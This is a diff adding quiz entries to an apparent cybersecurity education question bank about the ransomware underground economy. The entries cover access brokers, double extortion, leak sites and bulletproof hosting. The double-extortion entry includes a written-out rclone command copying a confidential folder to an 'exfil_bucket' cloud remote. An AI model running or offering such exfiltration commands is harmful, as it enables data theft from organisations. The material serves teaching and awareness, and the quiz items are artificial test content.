@@ -235,6 +235,46 @@ Browser Punycode: https://www.xn--bnk-login-94a.com (Fake server hosting credent
     codeExample: `// The Zero Trust Paradigm Shift:
 Legacy Castle-and-Moat: "If the user connects via VPN, trust all internal traffic." (FAILED)
 Zero Trust Architecture: "Assume the VPN is already compromised. Verify every packet, restrict lateral movement, enforce FIDO2 on every internal database." (RESILIENT)`
+  },
+  {
+    question: "What is an 'Initial Access Broker' (IAB) in the cybercriminal underground economy?",
+    shortAnswer: "A threat actor who compromises enterprise networks (via phishing, RDP brute force, or stolen credentials) and sells the persistent backdoor access to ransomware gangs on dark web markets.",
+    explanation: "IABs specialize in reconnaissance and exploitation, outsourcing extortion and data theft to ransomware affiliates (RaaS model) for a fee or revenue share.",
+    hint: "Underground specialists who breach networks and auction off persistent access.",
+    level: "moderate",
+    codeExample: "# Dark web listing: 'Access to $500M US Healthcare Corp, Domain Admin, $4,000 XMR'"
+  },
+  {
+    question: "How does the 'Double Extortion' tactic employed by Black Hat ransomware cartels work?",
+    shortAnswer: "Attackers exfiltrate confidential corporate data BEFORE encrypting internal servers, threatening to publicly leak stolen records if the decryption ransom is not paid.",
+    explanation: "Double extortion defeats offline backups; even if the victim restores systems from clean tape archives, they must pay to prevent regulatory fines (GDPR/HIPAA) and public exposure.",
+    hint: "Stealing data before encrypting, then threatening public leaks on a DLS.",
+    level: "advanced",
+    codeExample: "rclone copy C:\\Confidential\\ mega:exfil_bucket/ --transfers 16"
+  },
+  {
+    question: "What is a 'Dark Web Data Leak Site' (DLS) in Black Hat operations?",
+    shortAnswer: "A Tor hidden service (.onion site) operated by ransomware groups to name and shame non-paying victims, countdown deadlines, and publish leaked proprietary data dumps.",
+    explanation: "Pioneered by the Maze ransomware group in 2019, leak sites weaponize reputational damage and regulatory scrutiny to compel extortion settlements.",
+    hint: "Tor onion site used by extortionists to publish non-paying victim data.",
+    level: "moderate",
+    codeExample: "torify curl -s http://lockbit3...onion/victim_countdown"
+  },
+  {
+    question: "What are 'Bulletproof Hosting' providers and why are they favored by Black Hat groups?",
+    shortAnswer: "Hosting services located in non-extradition jurisdictions that intentionally ignore DMCA takedown requests, law enforcement subpoenas, and abuse complaints.",
+    explanation: "Bulletproof hosts provide command-and-control (C2) infrastructure and malware distribution points resistant to court-ordered seizure or Western law enforcement coordination.",
+    hint: "Web hosts that refuse to cooperate with international police subpoenas.",
+    level: "moderate",
+    codeExample: "whois c2_server.com | grep 'OrgName: Offshore Bulletproof Networks'"
+  },
+  {
+    question: "What motivates Black Hat actors beyond financial gain?",
+    shortAnswer: "Geopolitical sabotage, intellectual property theft, state-directed espionage, personal notoriety (ego), revenge (insider threats), and ideological warfare.",
+    explanation: "While cybercrime syndicates pursue profit, state-sponsored Black Hats prioritize long-term geopolitical advantage, such as stealing military blueprints or disrupting critical infrastructure.",
+    hint: "Espionage, geopolitical dominance, IP theft, revenge, and ideology.",
+    level: "basic",
+    codeExample: "TargetSectors = ['Defense', 'Semiconductors', 'Energy Grids', 'Gov Agencies'];"
   }
 ];
 
